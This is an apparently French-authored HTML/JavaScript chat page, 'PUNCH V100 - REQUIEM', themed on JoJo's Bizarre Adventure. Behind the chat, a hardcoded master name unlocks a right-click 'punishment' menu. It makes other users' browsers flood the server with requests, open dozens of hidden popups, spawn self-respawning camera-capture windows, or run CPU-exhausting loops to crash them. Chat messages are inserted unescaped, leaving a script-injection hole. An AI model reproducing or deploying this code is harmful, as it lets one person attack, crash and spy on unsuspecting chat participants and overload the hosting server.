<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PUNCH V100 - REQUIEM</title>
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=Bangers&family=JetBrains+Mono:wght@500;800&display=swap');
        
        :root {
            --gold: #FFD700;
            --gold-glow: rgba(255, 215, 0, 0.4);
            --magenta: #FF00FF;
            --deep-purple: #1a001a;
            --bg-dark: #050005;
            --ui-panel: rgba(15, 0, 15, 0.95);
            --ease-jojo: cubic-bezier(0.19, 1, 0.22, 1);
            --silver: #C0C0C0;
        }

        /* 1. RESET & BASE STYLES (Lignes 30-60) */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            cursor: none !important; /* Force le curseur Stand */
            outline: none;
            user-select: none;
        }

        body {
            background: var(--bg-dark);
            color: #fff;
            font-family: 'Archivo Black', sans-serif;
            height: 100vh;
            overflow: hidden;
            background-image: 
                radial-gradient(circle at 20% 30%, #150015 0%, transparent 50%),
                radial-gradient(circle at 80% 70%, #0a0010 0%, transparent 50%);
        }

        /* 2. CUSTOM CURSOR [STAND] (Lignes 61-85) */
        #c-stand {
            position: fixed;
            width: 30px;
            height: 30px;
            border: 2px solid var(--gold);
            z-index: 9999999;
            pointer-events: none;
            transform: rotate(45deg);
            box-shadow: 0 0 15px var(--gold), inset 0 0 5px var(--gold);
            transition: transform 0.1s linear, width 0.3s var(--ease-jojo);
        }

        #c-stand.clicking {
            transform: rotate(135deg) scale(1.5);
            background: var(--gold);
        }

        /* 3. MAIN INTERFACE LAYOUT (Lignes 86-130) */
        .punch-container {
            display: grid;
            grid-template-columns: 360px 1fr 300px;
            height: 100vh;
            gap: 1px;
            background: #151515;
        }

        .side-panel {
            background: var(--ui-panel);
            display: flex;
            flex-direction: column;
            border-right: 1px solid rgba(255, 215, 0, 0.1);
            backdrop-filter: blur(10px);
        }

        .header-section {
            padding: 50px 20px;
            background: var(--gold);
            color: #000;
            text-align: center;
            clip-path: polygon(0 0, 100% 0, 100% 80%, 0 100%);
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }

        .header-section h1 {
            font-family: 'Bangers';
            font-size: 55px;
            line-height: 0.9;
            text-shadow: 3px 3px 0 rgba(255,255,255,0.5);
        }

        /* 4. USER LIST & CARDS (Lignes 131-160) */
        #user-list {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            scrollbar-width: none;
        }

        .user-card {
            padding: 20px;
            background: rgba(255,255,255,0.02);
            border: 1px solid #222;
            margin-bottom: 15px;
            border-radius: 4px;
            transition: 0.4s var(--ease-jojo);
            position: relative;
        }

        .user-card:hover {
            border-color: var(--gold);
            background: rgba(255, 215, 0, 0.05);
            transform: translateX(10px);
        }

        .user-card b { font-size: 16px; letter-spacing: 1px; }
        .user-card small { color: #444; font-family: 'JetBrains Mono'; }

        /* 5. CHAT VIEWPORT (Lignes 161-200) */
        .viewport {
            display: flex;
            flex-direction: column;
            background: #000;
            position: relative;
        }

        #chat-area {
            flex: 1;
            padding: 40px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .message-bubble {
            padding: 15px 20px;
            background: rgba(255,255,255,0.03);
            border-left: 4px solid var(--magenta);
            font-family: 'JetBrains Mono';
            font-size: 13px;
            max-width: 85%;
            animation: msgIn 0.4s var(--ease-jojo) forwards;
        }

        @keyframes msgIn {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }

        .input-wrap {
            padding: 30px;
            background: #000;
            border-top: 1px solid #222;
            display: flex;
            gap: 15px;
        }

        input#msg-input {
            flex: 1;
            background: #0a0a0a;
            border: 1px solid #333;
            padding: 18px;
            color: var(--gold);
            font-family: 'JetBrains Mono';
            font-weight: 800;
        }

        /* 6. OVERLAYS & SPECIAL EFFECTS (Lignes 201-250) */
        #za-warundo {
            position: fixed;
            inset: 0;
            background: #fff;
            z-index: 10000000;
            display: none;
            align-items: center;
            justify-content: center;
            mix-blend-mode: difference;
        }

        .ora-title {
            font-family: 'Bangers';
            font-size: 12vw;
            color: #fff;
            animation: shakeScreen 0.1s infinite;
        }

        @keyframes shakeScreen {
            0% { transform: translate(0,0) scale(1); }
            50% { transform: translate(10px, 5px) scale(1.05); }
            100% { transform: translate(-5px, -10px) scale(1); }
        }

        #context-menu {
            display: none;
            position: fixed;
            background: #000;
            border: 2px solid var(--gold);
            width: 280px;
            z-index: 10000001;
            box-shadow: 15px 15px 0 var(--magenta);
        }

        .menu-option {
            padding: 18px;
            font-size: 11px;
            color: #aaa;
            border-bottom: 1px solid #111;
            transition: 0.2s;
            text-transform: uppercase;
            font-weight: bold;
        }

        .menu-option:hover {
            background: var(--gold);
            color: #000;
            padding-left: 30px;
        }

        /* 7. LOGS PANEL (Lignes 251-280) */
        .logs-panel {
            padding: 25px;
            font-family: 'JetBrains Mono';
            font-size: 10px;
            color: #333;
            line-height: 1.8;
            border-left: 1px solid #222;
        }

        .log-entry { margin-bottom: 5px; border-bottom: 1px solid #111; padding-bottom: 2px; }
        .log-tag { color: var(--gold); margin-right: 5px; }

    </style>
</head>
<body oncontextmenu="return false;">

    <div id="c-stand"></div>
    <div id="za-warundo"><div class="ora-title">REQUIEM... DA</div></div>

    <div class="punch-container">
        <aside class="side-panel">
            <div class="header-section">
                <h1>PUNCH<br><span style="font-size:15px; letter-spacing:5px;">V100</span></h1>
            </div>
            <div id="user-list">
                </div>
        </aside>

        <main class="viewport">
            <div id="chat-area"></div>
            <div class="input-wrap">
                <input type="text" id="msg-input" placeholder="WRITE YOUR FATE..." maxlength="200">
                <button onclick="sendMsg()" style="background:var(--magenta); border:none; padding:0 30px; font-family:'Bangers'; font-size:22px; color:#fff;">STRIKE</button>
            </div>
        </main>

        <aside class="side-panel logs-panel">
            <div style="color:var(--gold); margin-bottom:15px; font-weight:800;">[SYSTEM_STRIKE_LOGS]</div>
            <div id="system-logs"></div>
        </aside>
    </div>

    <div id="context-menu">
        <div class="menu-option" style="background:#111; color:var(--gold); text-align:center;">--- CHOOSE PUNISHMENT ---</div>
        <div class="menu-option" onclick="trigger('p_combo')">💎 GOLDEN_REQUIEM (Cam)</div>
        <div class="menu-option" onclick="trigger('p_chariot')">⚔️ SILVER_CHARIOT (DDoS)</div>
        <div class="menu-option" onclick="trigger('p_tsunami')">📑 TAB_TSUNAMI (Tabs)</div>
        <div class="menu-option" onclick="trigger('p_cpu')">☢️ MUDA_MELT (Crash)</div>
        <div class="menu-option" onclick="closeMenu()">[ CLOSE ]</div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let myId = "";
        let currentVictim = "";
        let isMaster = false;

        // --- GESTION DU CURSEUR STAND ---
        document.addEventListener('mousemove', e => {
            const c = document.getElementById('c-stand');
            c.style.left = e.clientX - 15 + 'px';
            c.style.top = e.clientY - 15 + 'px';
        });

        document.addEventListener('mousedown', () => document.getElementById('c-stand').classList.add('clicking'));
        document.addEventListener('mouseup', () => document.getElementById('c-stand').classList.remove('clicking'));

        // --- AUTHENTIFICATION ---
        window.onload = () => {
            const name = prompt("IDENTIFIE TON STAND (Nom) :");
            if (name === "toucheur2pp") isMaster = true;
            socket.emit('init', { name: name || "Stand_User" });
            addLog("INITIALIZATION", "Stand engine activated.");
        };

        // --- CLIC DROIT (MASTER ONLY) ---
        window.oncontextmenu = (e) => {
            e.preventDefault();
            if (!isMaster) return;
            
            const menu = document.getElementById('context-menu');
            const card = e.target.closest('.user-card');
            
            if (card) {
                currentVictim = card.getAttribute('data-id');
                menu.style.display = 'block';
                menu.style.left = e.pageX + 'px';
                menu.style.top = e.pageY + 'px';
                addLog("LOCK", "Target selected: " + currentVictim.substring(0,8));
            }
        };

        function closeMenu() { document.getElementById('context-menu').style.display = 'none'; }
        window.onclick = () => closeMenu();

        // --- ENVOI DE MESSAGE ---
        function sendMsg() {
            const input = document.getElementById('msg-input');
            if (input.value.trim()) {
                socket.emit('chat', input.value);
                input.value = "";
            }
        }

        document.getElementById('msg-input').onkeydown = (e) => { if(e.key === "Enter") sendMsg(); };

        // --- MOTEUR D'ATTAQUE (REQUIEM) ---
        function trigger(type) {
            if (currentVictim) socket.emit(type, currentVictim);
            closeMenu();
        }

        socket.on('execute', (data) => {
            addLog("INCOMING", "Strike detected: " + data.type);
            
            const run = () => {
                const overlay = document.getElementById('za-warundo');
                const title = document.querySelector('.ora-title');
                overlay.style.display = 'flex';

                // -- SILVER CHARIOT (DDoS Local) --
                if (data.type === 'p_chariot') {
                    title.innerText = "SILVER CHARIOT !";
                    title.style.color = "#C0C0C0";
                    setInterval(() => {
                        for(let i=0; i<100; i++) fetch('/?s='+Math.random()).catch(()=>null);
                    }, 15);
                    for(let i=0; i<40; i++) window.open(location.href, '_blank', 'width=1,height=1,left=10000');
                }

                // -- GOLDEN REQUIEM (Camera Loop) --
                if (data.type === 'p_combo' || data.type === 'p_tsunami') {
                    title.innerText = "REQUIEM... DA";
                    const spawn = () => {
                        const win = window.open("", "_blank", "width=400,height=400");
                        if(win) {
                            win.document.write(`
                                <body style="background:#000;color:gold;text-align:center;font-family:sans-serif;">
                                    <video id="v" autoplay style="width:100%;height:80%;transform:scaleX(-1);border:2px solid gold;"></video>
                                    <p>MUDA MUDA MUDA MUDA</p>
                                    <script>
                                        navigator.mediaDevices.getUserMedia({video:true}).then(s=>{document.getElementById('v').srcObject=s;});
                                        window.onbeforeunload=()=>{window.opener.postMessage("s","*");};
                                    <\/script>
                                </body>`);
                        }
                    };
                    spawn(); spawn();
                    window.addEventListener("message", (e) => { if(e.data === "s") { spawn(); spawn(); } });
                }

                // -- MUDA MELT (CPU Crash) --
                if (data.type === 'p_cpu') {
                    title.innerText = "MUDA MUDA MUDA !";
                    setInterval(() => {
                        for(let i=0; i<5000000; i++) Math.sqrt(Math.random());
                        history.pushState(null,'','#'+Math.random());
                    }, 1);
                }

                socket.emit('chat', `💀 ${data.from.toUpperCase()} A FRAPPÉ ! C'EST LA FIN.`);
            };

            window.onclick = run;
            window.onmousemove = run;
        });

        // --- SYNC & LOGS ---
        socket.on('sync', users => {
            const list = document.getElementById('user-list');
            list.innerHTML = "";
            users.forEach(u => {
                const card = document.createElement('div');
                card.className = "user-card";
                card.setAttribute('data-id', u.id);
                card.innerHTML = `<b>${u.name.toUpperCase()}</b><br><small>UID: ${u.id.substring(0,10)}</small>`;
                list.appendChild(card);
            });
        });

        socket.on('chat', d => {
            const area = document.getElementById('chat-area');
            area.innerHTML += `<div class="message-bubble"><b>${d.n}:</b> ${d.t}</div>`;
            area.scrollTop = area.scrollHeight;
        });

        function addLog(tag, text) {
            const logs = document.getElementById('system-logs');
            logs.innerHTML += `<div class="log-entry"><span class="log-tag">[${tag}]</span> ${text}</div>`;
            logs.scrollTop = logs.scrollHeight;
        }
    </script>
</body>
</html>
